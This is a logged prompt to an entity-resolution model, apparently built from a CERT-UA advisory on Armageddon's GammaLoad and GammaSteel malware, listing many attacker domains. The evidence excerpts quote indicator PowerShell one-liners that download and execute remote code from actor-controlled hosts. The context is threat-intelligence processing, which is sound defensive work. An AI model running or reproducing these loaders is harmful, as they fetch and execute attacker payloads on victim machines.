=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. stage1.ps1
E3. GammaLoad.PS1_v2
E4. stage2.ps1
E5. TRYxaEbX [aka TRYxaEbX.ps1]
E6. z.ps1
E7. OUTSTEEL
E8. GraphSteel
E9. TRYxaEbX_2.ps1
E10. Test-ProxyLogon.ps1
E11. .NET Framework
E12. IIS [aka IIS (Internet Information Services)]
E13. Malware Information Sharing Platform (MISP) [aka MISP]
E14. MarsStealer
E15. python-requests
E16. GrimPlant
E17. FTPGetter
E18. JesterStealer
E19. Cisco IOS XE
E20. Hashcat
E21. nmap
E22. needrestart
E23. Meterpreter
E24. oYUuQbXu
E25. PowerShell [aka powershell.exe]
E26. 223329.exe
E27. POWERGAP
E28. wscript.exe
E29. 62ea.exe
E30. SPECTR.Shell
E31. ckZ89.ExE
E32. 966449.exe
E33. MS PowerPoint
E34. GammaSteel.NET
E35. HarvesterX
E36. PowerShell (powershell.exe)
E37. GammaSteel.PS1
E38. kopratiso.ru
E39. acteran.ru
E40. bilitora.ru
E41. dodortar.ru
E42. apoxipodes.ru
E43. fishitor.ru
E44. a0322810.xsph.ru
E45. tiloraso.ru
E46. dod-upload.dodortar.ru
E47. billyhot.ru
E48. tortunas.ru
E49. candidar.ru
E50. lnk-upload.dodortar.ru
E51. arentuk.com
E52. motocheck.in
E53. stormpredictor.host
E54. nx0.ru
E55. meteolink.host
E56. successilin.top
E57. xsph.ru
E58. erwini.ru
E59. mulleti.ru
E60. bul-opros.top
E61. iol.pt
E62. toknowall.com
E63. gopoppers.com
E64. varanasiclick.ru
E65. podologaneri.it
E66. nitikora.ru
E67. districoperav.icu
E68. potrakit.ru
E69. giraffe-tour.ru
E70. rivierafamily.com
E71. mx-out-14.default-host.net
E72. tridiuma.ru
E73. yandex.ru
E74. olei.ro
E75. jevejosader.top
E76. enlamentedeunasesor.com
E77. milotrad.ru
E78. milotraf.ru
E79. s8.h.mchost.ru
E80. aspe.ro
E81. omyce.ru
E82. pastebin.com
E83. leonardis.ru
E84. jokotras.ru
E85. afi-opros.top
E86. nikotod.ru
E87. mitraseo.hol.es
E88. parodadoca.ru
E89. marmaris.com.ua
E90. ryomy.ru
E91. ncscc.gov.ua
E92. www.msftncsi.com
E93. tas-gos.top
E94. staystrongjewels.com
E95. wi-opros.top
E96. winscp.net
E97. xcasinobonuses.net
E98. viewdns.net
E99. servebeer.com
E100. evil.server.com
E101. 3utilities.com
E102. gotdns.ch
E103. agreminj.com
E104. whoer.net
E105. airmauritiusticket.com
E106. helpzzfound.site
E107. bounceme.net
E108. ddns.net
E109. sytes.net
E110. plexbd.net
E111. brunoboys.net
E112. dcshost.net
E113. d-upl.ddns.net
E114. freedynamicdns.net
E115. gov-ua.info
E116. ns.ns2-dns.com
E117. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E118. dyndns.com
E119. ns.ns3-dns.com
E120. datagroup.ddns.net
E121. www.facebook.com
E122. winchconstruction.com
E123. www.michiganmastereltiempo.com
E124. www.symantec.com
E125. fluoxi.com
E126. lesrochersblancs.com
E127. atlantar.ru
E128. motoristo.ru
E129. moolin.ru
E130. bubenci.ru
E131. callsol.ru
E132. clipperso.ru
E133. cooperi.ru
E134. detroito.ru
E135. farafauler.ru
E136. flayga.ru
E137. ganara.ru
E138. hawksi.ru
E139. hofsteder.ru
E140. kilitro.ru
E141. kurapat.ru
E142. lnasfe.ru
E143. lopasts.ru
E144. mafirti.ru
E145. metanat.ru
E146. mitlubald.ru
E147. paparat.ru
E148. pasamart.ru
E149. qkcew.ru
E150. rncsq.ru
E151. tarlit.ru
E152. tbwelo.ru
E153. wicksl.ru
E154. xcqef.ru
E155. nxkad.ru
E156. dnslookup.seowebchecker.com
E157. tools.nexcess.net
E158. viewdns.info
E159. www.portcheckers.com
E160. lover.printing82.detroito.ru
Mentions:
